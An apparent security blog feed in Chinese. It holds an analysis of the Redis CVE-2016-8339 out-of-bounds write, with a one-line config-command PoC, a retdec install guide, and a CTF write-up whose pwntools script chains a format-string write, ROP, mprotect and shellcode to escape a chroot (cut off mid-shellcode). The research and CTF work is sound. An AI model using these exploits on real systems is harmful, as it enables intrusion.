class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getClientTypeByName</span><span class="params">(<span class="keyword">char</span> *name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;normal&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_NORMAL;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;slave&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_SLAVE;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;pubsub&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_PUBSUB;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!strcasecmp(name,<span class="string">&quot;master&quot;</span>)) <span class="keyword">return</span> CLIENT_TYPE_MASTER; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过简单字符串类型比较，然后返回不同的值。返回值的定义宏如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_NORMAL 0 <span class="comment">/* Normal req-reply clients + MONITORs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_SLAVE 1  <span class="comment">/* Slaves. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_PUBSUB 2 <span class="comment">/* Clients subscribed to PubSub channels. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_MASTER 3 <span class="comment">/* Master. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_OBUF_COUNT 3 <span class="comment">/* Number of clients to expose to output</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    buffer configuration. Just the first</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    three: normal, slave, pubsub. */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将返回的值放在 <code>class</code>字符串中，然后紧接着作为数组下标进行处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">hard_limit_bytes</span> = <span class="title">hard</span>;</span></span><br><span class="line">server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_bytes</span> = <span class="title">soft</span>;</span></span><br><span class="line">server.client_obuf_limits[<span class="class"><span class="keyword">class</span>].<span class="title">soft_limit_seconds</span> = <span class="title">soft_seconds</span>;</span></span><br></pre></td></tr></table></figure><p>我们查看<code> server.client_obuf_limits[class]</code>的解析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clientBufferLimitsConfig client_obuf_limits[CLIENT_TYPE_OBUF_COUNT]; <span class="comment">//数组大小为3</span></span><br><span class="line">    <span class="comment">/* AOF persistence */</span></span><br><span class="line">    <span class="keyword">int</span> aof_state;                  <span class="comment">/* AOF_(ON|OFF|WAIT_REWRITE) */</span></span><br><span class="line">    <span class="keyword">int</span> aof_fsync;                  <span class="comment">/* Kind of fsync() policy */</span></span><br><span class="line">    <span class="keyword">char</span> *aof_filename;             <span class="comment">/* Name of the AOF file */</span></span><br><span class="line">    <span class="keyword">int</span> aof_no_fsync_on_rewrite;    <span class="comment">/* Don&#x27;t fsync if a rewrite is in prog. */</span></span><br><span class="line">    <span class="keyword">int</span> aof_rewrite_perc;           <span class="comment">/* Rewrite AOF if % growth is &gt; M and... */</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_NORMAL 0 <span class="comment">/* Normal req-reply clients + MONITORs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_SLAVE 1  <span class="comment">/* Slaves. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_PUBSUB 2 <span class="comment">/* Clients subscribed to PubSub channels. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_MASTER 3 <span class="comment">/* Master. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLIENT_TYPE_OBUF_COUNT 3 <span class="comment">/* Number of clients to expose to output</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    buffer configuration. Just the first</span></span></span><br><span class="line"><span class="meta"><span class="comment">                                    three: normal, slave, pubsub. */</span></span></span><br></pre></td></tr></table></figure><p>可以看到，<code>getClientTypeByName</code> 函数解析客户端类型并返回一个值存储在class变量中，它的取值范围是[-1, 3]，接下来<code>client_obuf_limits</code>使用class变量作为下标去访问结构体数组并赋值。然而从<code>client_obuf_limits</code>的定义处可以发现，它的长度是3。</p><p>这就意味着，这存在着数组下标越界的可能性，由于后续操作是写，所以存在越界写。我们进一步查看关于<code>clientBufferLimitsConfig </code> 结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">clientBufferLimitsConfig</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> hard_limit_bytes;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> soft_limit_bytes;</span><br><span class="line">    <span class="keyword">time_t</span> soft_limit_seconds;</span><br><span class="line">&#125; clientBufferLimitsConfig;</span><br></pre></td></tr></table></figure><p>结构体大小为 24 字节，这说明攻击者最多向client_obuf_limits数组后写入24字节的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">clientBufferLimitsConfig client_obuf_limits[CLIENT_TYPE_OBUF_COUNT]; <span class="comment">//数组大小为3</span></span><br><span class="line">    <span class="comment">/* AOF persistence */</span></span><br><span class="line">    <span class="keyword">int</span> aof_state;                  <span class="comment">/* AOF_(ON|OFF|WAIT_REWRITE) */</span></span><br><span class="line">    <span class="keyword">int</span> aof_fsync;                  <span class="comment">/* Kind of fsync() policy */</span></span><br><span class="line">    <span class="keyword">char</span> *aof_filename;             <span class="comment">/* Name of the AOF file */</span></span><br><span class="line">    <span class="keyword">int</span> aof_no_fsync_on_rewrite;    <span class="comment">/* Don&#x27;t fsync if a rewrite is in prog. */</span></span><br><span class="line">    <span class="keyword">int</span> aof_rewrite_perc;           <span class="comment">/* Rewrite AOF if % growth is &gt; M and... */</span></span><br></pre></td></tr></table></figure><p>由上部分内容，我们大概可以知道client_obuf_limits数组是redisServer结构体的一个成员，它的后面紧跟着AOF状态域（Redis 将所有对数据库进行过写入的命令记录到 AOF 文件， 以此达到记录数据库状态的目的)。攻击者是可以覆盖到这些域并写入数据的。</p><h3 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h3><p>由于只能写入24 字节的内容，我们仅仅只能覆盖到后面的，在这些域中暂时只看到<code>aof_filename</code>这个指针存在利用点。</p><h4 id="what-is-AOF？"><a href="#what-is-AOF？" class="headerlink" title="what is AOF？"></a>what is AOF？</h4><p>Redis 分别提供了 RDB 和 AOF 两种持久化机制：</p><ul><li>RDB 将数据库的快照（snapshot）以二进制的方式保存到磁盘中。</li><li>AOF 则以协议文本的方式，将所有对数据库进行过写入的命令（及其参数）记录到 AOF 文件，以此达到记录数据库状态的目的。</li></ul><h4 id="AOF-doing-？"><a href="#AOF-doing-？" class="headerlink" title="AOF doing ？"></a>AOF doing ？</h4><p>Redis 将所有对数据库进行过写入的命令（及其参数）记录到 AOF 文件， 以此达到记录数据库状态的目的， 为了方便起见， 我们称呼这种记录过程为同步。</p><p>举个例子， 如果执行以下命令： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">redis&gt; RPUSH list 1 2 3 4</span><br><span class="line">(integer) 4</span><br><span class="line"></span><br><span class="line">redis&gt; LRANGE list 0 -1</span><br><span class="line">1) &quot;1&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;3&quot;</span><br><span class="line">4) &quot;4&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; KEYS *</span><br><span class="line">1) &quot;list&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; RPOP list</span><br><span class="line">&quot;4&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; LPOP list</span><br><span class="line">&quot;1&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; LPUSH list 1</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line">redis&gt; LRANGE list 0 -1</span><br><span class="line">1) &quot;1&quot;</span><br><span class="line">2) &quot;2&quot;</span><br><span class="line">3) &quot;3&quot;</span><br></pre></td></tr></table></figure><p>那么其中四条对数据库有修改的写入命令就会被同步到 AOF 文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RPUSH list 1 2 3 4</span><br><span class="line"></span><br><span class="line">RPOP list</span><br><span class="line"></span><br><span class="line">LPOP list</span><br><span class="line"></span><br><span class="line">LPUSH list 1</span><br></pre></td></tr></table></figure><p>为了处理的方便， AOF 文件使用网络通讯协议的格式来保存这些命令。</p><p>比如说， 上面列举的四个命令在 AOF 文件中就实际保存如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line">$6</span><br><span class="line">SELECT</span><br><span class="line">$1</span><br><span class="line">0</span><br><span class="line">*6</span><br><span class="line">$5</span><br><span class="line">RPUSH</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$1</span><br><span class="line">2</span><br><span class="line">$1</span><br><span class="line">3</span><br><span class="line">$1</span><br><span class="line">4</span><br><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">RPOP</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">*2</span><br><span class="line">$4</span><br><span class="line">LPOP</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">*3</span><br><span class="line">$5</span><br><span class="line">LPUSH</span><br><span class="line">$4</span><br><span class="line">list</span><br><span class="line">$1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>除了 <a href="http://redis.readthedocs.org/en/latest/connection/select.html#select">SELECT</a> 命令是 AOF 程序自己加上去的之外， 其他命令都是之前我们在终端里执行的命令。</p><p>同步命令到 AOF 文件的整个过程可以分为三个阶段：</p><ol><li>命令传播：Redis 将执行完的命令、命令的参数、命令的参数个数等信息发送到 AOF 程序中。</li><li>缓存追加：AOF 程序根据接收到的命令数据，将命令转换为网络通讯协议的格式，然后将协议内容追加到服务器的 AOF 缓存中。</li><li>文件写入和保存：AOF 缓存中的内容被写入到 AOF 文件末尾，如果设定的 AOF 保存条件被满足的话， <code>fsync</code> 函数或者 <code>fdatasync</code>函数会被调用，将写入的内容真正地保存到磁盘中。</li></ol><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p><code>aof_filename </code>这个字符指针值得注意，通过修改这个指针，在具体的环境下</p><p>（1）通过修改这个指针，在具体的环境下，攻击者可以达到利用AOF数据覆写任意文件的目的；</p><p>（2）加载通过其他途径构造的恶意AOF文件，来进行进一步的攻击。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>config set client-output-buffer-limit &quot;master 1094795585 1094795585 1094795585&quot;</code></p><p>效果如下：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180802154400.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180802154400.png"></a></p><p>可以发现 <strong>aof_state</strong> 、<strong>aof_filename</strong>、以及**aof_no_fsync_on_rewrite **被覆写了。</p><h3 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h3><p>redis 的修复记录：</p><p><a href="https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977">https://github.com/antirez/redis/commit/6d9f8e2462fc2c426d48c941edeb78e5df7d2977</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180727181434.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180727181434.png"></a></p><p>class 的值了做了进一步判断。</p><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><p><a href="http://redisbook.readthedocs.io/en/latest/internal/aof.html">http://redisbook.readthedocs.io/en/latest/internal/aof.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2016-8339 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>retdec的安装</title>
      <link href="mips-decompiler-retdec-install-guide.html"/>
      <url>mips-decompiler-retdec-install-guide.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>环境：windows 7</p><p>IDA版本： 7.0</p><p>分两步走：</p><h2 id="安装retdec-ida-plugin"><a href="#安装retdec-ida-plugin" class="headerlink" title="安装retdec-ida-plugin"></a>安装retdec-ida-plugin</h2><p><strong>下载plugin</strong></p><p>从 <a href="https://github.com/avast-tl/retdec-idaplugin">https://github.com/avast-tl/retdec-idaplugin</a> 下载retdec-idaplguin,由于我的ida 版本是7.0 就此，我们选择5.0 的windows版本（如果是ida 6.8 请选择 4.0版本）</p><p><strong>安装</strong></p><p>将下载后的plugin 安装到ida的plguin目录下：</p><h2 id="安装-retdec-反编译工具"><a href="#安装-retdec-反编译工具" class="headerlink" title="安装 retdec 反编译工具"></a>安装 retdec 反编译工具</h2><p><a href="https://github.com/avast-tl/retdec">https://github.com/avast-tl/retdec</a> 官方的github就此做了详细说明，我这里大概简述下：</p><ol><li>下载 retdec ,<a href="https://github.com/avast-tl/retdec/releases%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%88%91%E4%BB%AC%E6%98%AFida">https://github.com/avast-tl/retdec/releases，由于我们是ida</a> 7.0版本，就此选择<strong>v3.1</strong></li></ol><p>（如果是ida 6.8 请选择 v3.0版本）</p><ol start="2"><li><p>解压压缩包到某一目录下即可</p></li><li><p>安装 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=48145">Microsoft Visual C++ Redistributable for Visual Studio 2015</a></p></li><li><p>安装 <a href="http://www.msys2.org/">MSYS2</a> 并设置好环境变量（Path下）</p></li><li><p>在 ida 的 菜单栏中，选择 option-&gt;Retdec plguin option</p></li></ol><p>   <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/retdec-hotkey.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/retdec-hotkey.jpg"></a></p><p>就此就可以使用了啦~ 撒花</p><h2 id="小建议"><a href="#小建议" class="headerlink" title="小建议"></a>小建议</h2><p>IDA 6.8 配 v3.0 + retdec-plugin-4.0版本食用效果最佳。比较推荐这个版本的配置。</p><h2 id="2019-01-13-更新"><a href="#2019-01-13-更新" class="headerlink" title="2019-01-13 更新"></a>2019-01-13 更新</h2><p>在先知看到有人引用我了我的博客，所以我做一个更新</p><p><a href="https://github.com/avast-tl/retdec-idaplugin">https://github.com/avast-tl/retdec-idaplugin</a> 中的 retdec-idaplugin 已经更新到了 v7.0</p><p><a href="/Users/swing/Desktop/Blog/hexo/source/_posts/20190114000321.png" class="gallery-item"><img src="/Users/swing/Desktop/Blog/hexo/source/_posts/20190114000321.png"></a></p><p>第一步 ，依然是将 ida plugin 安装到相应目录里</p><p>第二步，下载 retdec</p><p>retdec 更新到 3.2 版本了。</p><p>现在与以前不同的是，现在采用了 Python 脚本，已经不需要以前那些繁琐的工作了，只要设置好Python Path 就行了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114002929.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114002929.png"></a></p><p>并且，是得 Py3 ，设置好 decompiler 路径。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114003450.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190114003450.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> retdec </tag>
            
            <tag> mips </tag>
            
            <tag> decompiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 铁人三项 西北赛区 easyformat</title>
      <link href="2018-t3sec-Northwest-Division.html"/>
      <url>2018-t3sec-Northwest-Division.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>放了好久了 一直没写,,,</p><h2 id="easyformat"><a href="#easyformat" class="headerlink" title="easyformat"></a>easyformat</h2><p>这个题当时现场是没人做出来的，全国听说也只有两人…</p><p>这是一个沙箱逃逸题，chroot了 需要逃逸出来…</p><p>思路是：</p><p>首先通过fmt 进行指针劫持，然后构造rop，创建一段可以 shellcode的空间。之后通过 <strong>ptrace</strong>去附加父进程。</p><p>Ps: <a href="https://github.com/WinMin/Swings/tree/master/libformatstr">libformatstr Python库地址</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from mypwn import *</span></span><br><span class="line"><span class="comment"># from zio import *</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;strace -f -o aa.txt ./format&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = zio(target)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact</span>(<span class="params">io</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_recv</span>():</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                output = io.read_until_timeout(timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="comment"># print output</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    t1 = Thread(target=run_recv)</span><br><span class="line">    t1.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = raw_input()</span><br><span class="line">        <span class="keyword">if</span> d != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            io.writeline(d)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./format&#x27;</span>)</span><br><span class="line">stdout=<span class="number">0x6CC300</span></span><br><span class="line"></span><br><span class="line">f=FormatStr(isx64=<span class="number">1</span>,autosort=<span class="literal">False</span>)</span><br><span class="line">f[stdout+<span class="number">0xa0</span>]=stdout</span><br><span class="line">f[stdout+<span class="number">0x98</span>]=stdout+<span class="number">0x30</span></span><br><span class="line">f[stdout+<span class="number">0x50</span>]=<span class="number">0x400BD0</span> <span class="comment"># input function</span></span><br><span class="line">f.dword(stdout+<span class="number">0xd8</span>,<span class="number">0x4BF780</span><span class="number">-0x38</span>)</span><br><span class="line"><span class="comment"># gdb attach `ps -aux|grep ./format$|awk &#x27;&#123;print $2&#125;&#x27;|sort -r`</span></span><br><span class="line">raw_input(<span class="string">&#x27;wait to debug&#x27;</span>)</span><br><span class="line">p.writeline(f.payload(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Now we are able to modify the whole struct of stdout.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> p.waitfor(<span class="string">&#x27;Receiving all data&#x27;</span>) <span class="keyword">as</span> h:</span><br><span class="line">    <span class="keyword">with</span> p.local(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> p.recv():</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this is going to modify the page protection</span></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload+=p64(stdout+<span class="number">0x68</span>) <span class="comment"># new stack</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x44ad50</span>) <span class="comment"># xchg eax, esp ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x442fa9</span>) <span class="comment"># pop rdx ; pop rsi</span></span><br><span class="line">payload+=p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4006b5</span>) <span class="comment">#pop rdi</span></span><br><span class="line">payload+=p64(stdout&amp;<span class="number">0xfffff000</span>)</span><br><span class="line">payload+=p64(<span class="number">0x400644</span>) <span class="comment">#add rsp, 0x10 ; pop rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(stdout<span class="number">-0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4405F0</span>) <span class="comment">#mprotect</span></span><br><span class="line">payload+=p64(stdout+<span class="number">0xc0</span>) <span class="comment"># shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we can execute our shellcode.</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xorr9d, r9d</span></span><br><span class="line"><span class="string">    xoredi, edi</span></span><br><span class="line"><span class="string">    mov r8d, 0xFFFFFFFF</span></span><br><span class="line"><span class="string">    movecx, 0x22</span></span><br><span class="line"><span class="string">    movedx, 7</span></span><br><span class="line"><span class="string">    movesi, 0x4000</span></span><br><span class="line"><span class="string">    mov rax, 0x440510</span></span><br><span class="line"><span class="string">    call 